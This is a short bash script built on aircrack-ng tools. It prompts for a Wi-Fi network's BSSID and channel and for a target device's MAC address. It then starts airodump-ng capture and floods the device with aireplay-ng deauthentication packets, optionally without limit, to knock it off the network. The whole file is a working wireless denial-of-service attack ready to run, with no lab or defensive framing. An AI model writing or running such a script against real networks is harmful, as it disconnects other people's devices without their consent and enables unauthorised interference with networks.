#!/bin/bash
 

	ifconfig wlan0 down
	tput setaf 1;   echo "Succesfully took down wireless card.$(tput sgr 0)"
	aireplay-ng -9 wlan0
	tput setaf 6;   echo "Enter network's BSSID:$(tput sgr 0)"
	read bssID
	tput setaf 6;   echo "Enter network's channel:$(tput sgr 0)"
	read channelNum
	xterm -hold -e airodump-ng -c$channelNum --bssid $bssID wlan0 & tput setaf 3; echo "Starting injection...$(tput sgr 0)"

	tput setaf 6;   echo "Enter MAC address of device you wish to kick:$(tput sgr 0)"
	read deviceID
	tput setaf 6;   echo "Enter number of deauthentication packets (0 for infinite):$(tput sgr 0)"
	read deauthPackets
	aireplay-ng -0 $deauthPackets -a $bssID -c $deviceID wlan0


